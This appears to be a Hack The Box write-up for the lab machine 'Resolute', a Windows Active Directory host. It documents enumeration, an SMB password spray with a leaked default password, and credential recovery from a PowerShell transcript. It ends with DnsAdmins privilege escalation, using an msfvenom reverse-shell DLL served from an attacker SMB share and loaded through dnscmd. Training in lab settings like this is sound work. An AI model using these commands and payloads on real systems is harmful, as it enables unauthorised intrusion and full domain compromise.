# Resolute

<table>
    <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Windows</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Medium</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>30</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>07 Dec 2019</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.169</td>
    </tr>
</table>

## Summary

This machine hosts Active Directory from which we can find the default password and figure out which user it belongs to. From there, we can find the credentials of another user. To get root, we take advantage of the membership to DnsAdmins and inject a DLL into the DNS service to get a reverse shell as root.

## Foothold

To begin, we will add the entry `10.10.10.169 resolute.htb` to `/etc/hosts` and then start scanning.

```
# nmap -sC -sV -T4 resolute.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 11:42 EDT
Nmap scan report for resolute.htb (10.10.10.169)
Host is up (0.045s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-30 15:53:50Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

We see that this is an Active Directory machine with LDAP on ports 389/3268 and Kerberos on port 88. The domain name is megabank.local. There is also SMB on port 445 and an additional port scan on all ports shows winrm on port 5985. We will begin enumeration on LDAP by using `enum4linux`.

```
# enum4linux -a resolute.htb 2>/dev/null
...
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
...
```

We see there are quite a few users which we will add to a file for later use. After looking at some of the output more closely, we see an important line:

```index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!```

We can try to log in to SMB as Marko.

```
# smbclient -L resolute.htb -U "marko"
Enter WORKGROUP\marko's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

The credentials weren't right for Marko but the password looks like a default password. We should try this password with every user to see if someone hasn't changed their password. There is a Metasploit module for this that we can use.

```
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS resolute.htb
RHOSTS => resolute.htb
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Welcome123!
SMBPass => Welcome123!
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.10.169:445      - 10.10.10.169:445 - Starting SMB login bruteforce
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\Administrator:Welcome123!',
[!] 10.10.10.169:445      - No active DB -- Credential data will not be saved!
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\Guest:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\krbtgt:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\DefaultAccount:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\ryan:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\marko:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\sunita:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\abigail:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\marcus:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\sally:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\fred:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\angela:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\felicia:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\gustavo:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\ulf:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\stevie:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\claire:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\paulo:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\steve:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\annette:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\annika:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\per:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\claude:Welcome123!',
[+] 10.10.10.169:445      - 10.10.10.169:445 - Success: '.\melanie:Welcome123!'
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\zach:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\simon:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\naoki:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: '.\:Welcome123!',
[*] resolute.htb:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## User

From this we see that Melanie's password is the default `Welcome123!`. We can use `evil-winrm` to get a shell as that user and get the flag.

```
# evil-winrm -i resolute.htb -u melanie -p Welcome123!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
0c3be4**************************
```

## Root

Now we will begin enumeration to try to escalate to root privileges. Looking at the Users folder, we see there is one other user with an account on this box, Ryan.

```
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
```

However, we are not able to to read contents from that folder. If we look higher up at `C:\`, there are actually hidden folders that we can see with PowerShell.

```
*Evil-WinRM* PS C:\> Get-ChildItem . -Force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        5/30/2020   4:14 AM      402653184 pagefile.sys
```

One interesting folder is `PSTranscripts`. If we navigate through this folder we can see a log of some PowerShell commands from Ryan with some helpful information.


```
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
...
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
...
```

There is a command logged that requires a password that Ryan put in as plaintext. We can now get a shell as Ryan using `evil-winrm`.

```
# evil-winrm -i resolute.htb -u ryan -p Serv3r4Admin4cc123!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

If we investigate more, we see that Ryan is part of several groups.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

One group here that stands out is the only local group, `MEGABANK\DnsAdmins`. The name of this group seems to imply that they have some sort of administrator capability that we could possibly abuse. A great write-up describing the attack we want is found [here](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2).

The article describes that a user in the `DnsAdmins` group can load arbitraty DLLs on the DNS server as root. First, we will build a reverse shell DLL using `msfvenom`.

```
# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.142 LPORT=12345 -f dll > reverse.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
```

Next, we will create a temporary SMB server from Impacket to host our DLL from to download to the machine. For Windows, this is better than using a regular Python HTTP server because of anti-virus.

```
# impacket-smbserver SHARE .
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

We will set up a `netcat` listener on our machine to listen for the reverse connection and then inject our DLL into the DNS running in order to get Administrator and get the flag.

```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.142\SHARE\reverse.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2752
        FLAGS              :
```

```# nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.10.14.142] from (UNKNOWN) [10.10.10.169] 64126
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt                                                                                        
type root.txt                                                                                                                         
e1d948**************************
```
